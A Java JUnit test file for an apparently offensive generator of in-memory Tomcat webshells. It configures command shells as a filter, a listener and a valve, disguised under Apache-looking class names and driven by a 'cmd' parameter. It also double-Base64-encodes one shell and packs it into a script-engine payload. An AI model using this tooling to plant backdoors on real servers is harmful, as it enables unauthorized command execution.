package com.reajason.javaweb.memshell.shelltool.command;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.command.CommandGenerator;
import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.utils.ClassUtils;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.params.provider.Arguments.arguments;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
class CommandFilterTest {

    static Stream<Arguments> casesProvider() {
        return Stream.of(
                arguments(ShellType.FILTER, CommandFilter.class, "org.apache.utils.CommandFilter"),
                arguments(ShellType.LISTENER, CommandListener.class, "org.apache.utils.CommandListener"),
                arguments(ShellType.VALVE, CommandValve.class, "org.apache.utils.CommandValve")

        );
    }

    @ParameterizedTest
    @MethodSource("casesProvider")
    void generate(String shellType, Class<?> clazz, String className) {
        ShellConfig generateConfig = new ShellConfig();
        generateConfig.setServer(Server.Tomcat);
        CommandConfig commandConfig = CommandConfig.builder()
                .shellTemplateClassName(clazz.getName())
                .shellClassName(className)
                .paramName("cmd")
                .build();
        generateConfig.setShellType(shellType);
        byte[] bytes = new CommandGenerator(generateConfig, commandConfig).getBytes();
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(commandConfig.getShellClassName(), obj.getClass().getName());
        assertEquals(commandConfig.getParamName(), ClassUtils.getFieldValue(obj, "paramName"));
    }

    @Test
    void testGenerator() throws Exception {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellType(ShellType.FILTER)
                .shellTool(ShellTool.Command)
                .build();

        CommandConfig commandConfig = CommandConfig.builder()
                .shellTemplateClassName(CommandFilter.class.getName())
                .shellClassName("org.apache.utils.CommandFilter")
                .paramName("cmd")
                .encryptor(CommandConfig.Encryptor.DOUBLE_BASE64)
                .build();
        InjectorConfig injectorConfig = new InjectorConfig();

        MemShellResult generate = new MemShellGenerator().generate(shellConfig, injectorConfig, commandConfig);
//        Files.write(Paths.get("hehe.class"), generate.getShellBytes());
        String pack = Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.from(generate));
        System.out.println(pack);
    }
}